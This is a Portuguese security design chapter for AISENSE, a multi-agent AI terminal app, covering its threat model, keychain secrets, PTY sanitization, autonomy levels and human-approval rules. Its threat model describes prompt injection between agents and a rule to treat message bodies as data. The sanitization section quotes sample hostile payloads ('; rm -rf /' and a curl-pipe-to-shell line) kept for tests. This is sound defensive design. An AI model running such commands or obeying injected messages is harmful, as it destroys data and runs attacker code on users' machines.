# 11 — Segurança

> O AISENSE executa processos arbitrários com as permissões do usuário e abre um socket local que
> esses processos usam. A superfície é pequena, mas precisa ser tratada com seriedade.

## Modelo de ameaça

| Ator | Pode | Mitigação |
|---|---|---|
| Processo local de outro usuário | Tentar conectar no socket do barramento | Socket `0600`; named pipe com DACL restrita ao SID do usuário |
| Processo local do **mesmo** usuário | Conectar no socket | Exige `AISENSE_TOKEN` válido; tokens são por sessão e expiram. Aceito como limite: quem já roda como você já pode ler seus arquivos |
| Agente de IA comprometido / alucinando | Enviar mensagens maliciosas a outros agentes | Sanitização de corpo, limites de taxa, tudo visível na timeline |
| Conteúdo vindo da rede (a IA leu uma página) | Tentar injeção de prompt via mensagem entre agentes | Mensagens sempre rotuladas com remetente; a skill orienta a tratar corpo como **dado, não instrução** |
| Skill importada de terceiro | Conter instruções hostis | Preview obrigatório antes de importar; skills não executam nada sozinhas |

## Segredos

- Chaves de API vão no **keychain do SO** via crate `keyring` (Keychain no macOS,
  Credential Manager no Windows, Secret Service no Linux).
- **Nunca** em `aisense.db`, `config.toml` ou log.
- Injetadas no PTY apenas no spawn, apenas para o agente que precisa.
- A UI mostra `sk-…abcd` (mascarado) e nunca permite copiar o valor de volta.
- `AISENSE_TOKEN` não é segredo de longa duração: dura a sessão do agente e é apagado no fim.

## Sanitização de mensagens injetadas no PTY

Escrever no stdin de um terminal é escrever em algo que interpreta sequências de controle.
Antes de qualquer injeção (modo `push`):

1. Remover `\x1b` (ESC), `\x07` (BEL), `\x9b` (CSI) e todos os controles C0 exceto `\t`.
2. Normalizar `\r\n` e `\r` para espaço — **o `\r` de submissão é adicionado pelo AISENSE**,
   nunca vem do corpo da mensagem. Sem isso, uma mensagem com quebra de linha executaria comandos.
3. Limitar a `inject.max_chars`; acima disso, gravar em arquivo e injetar só o caminho.
4. Prefixar com `[AISENSE] Mensagem de @remetente:` — o agente sempre sabe que é mensagem, não ordem sua.

Há teste obrigatório em `aisense-core::delivery::sanitize` com corpus de payloads maliciosos
(`"; rm -rf /"`, `"\r\ncurl evil.sh|sh"`, escape ANSI, OSC 8, etc.).

## Autonomia por agente

| Nível | Significado |
|---|---|
| `ask` (padrão) | O runtime pede confirmação para ações destrutivas, com o comportamento padrão dele |
| `trusted` | Flags de auto-aprovação do runtime são passadas (ex.: modo sem confirmação) |

`trusted` exige confirmação explícita ao ativar, com aviso claro e em texto direto sobre o que muda.
Nunca é o padrão, nunca é ativado por modelo de equipe.

## Permissões do Tauri

Allowlist mínima. Habilitado: diálogo de arquivo, shell **apenas** para os sidecars declarados,
sistema de arquivos restrito a `~/.aisense` e ao workdir da equipe, clipboard, notificações.
Desabilitado: `shell.open` genérico, `http` (o front não faz requisição nenhuma), `process.exit` global.
CSP restritiva, sem `unsafe-eval`, sem origem externa.

## Comandos do barramento que exigem confirmação humana

Nenhum agente pode, sozinho:
- criar, apagar ou reconfigurar outro agente;
- mudar o nível de autonomia de qualquer agente;
- editar skills;
- ler ou escrever fora do workdir da equipe através do AISENSE.

O agente `@coordenador` **propõe** ("sugiro criar um `@qa`") e a UI mostra a proposta com
[Aceitar] / [Recusar]. Isso é deliberado: agente que cria agente é como recursão sem caso base.

## Atualizações

Auto-update assinado (Tauri updater) com chave mantida fora do repositório.
Verificação de assinatura obrigatória. Usuário pode desligar.

## Privacidade

- Nenhuma telemetria por padrão (ver D5 em [ESTADO.md](ESTADO.md)).
- Nenhuma requisição de rede feita pelo AISENSE além da checagem de atualização (desligável).
- O que a CLI de IA faz com a rede é responsabilidade dela; o app apenas a hospeda.
- "Exportar diagnóstico" gera um `.zip` com logs **redigidos** (tokens e caminhos de home mascarados)
  e mostra o conteúdo antes de salvar.
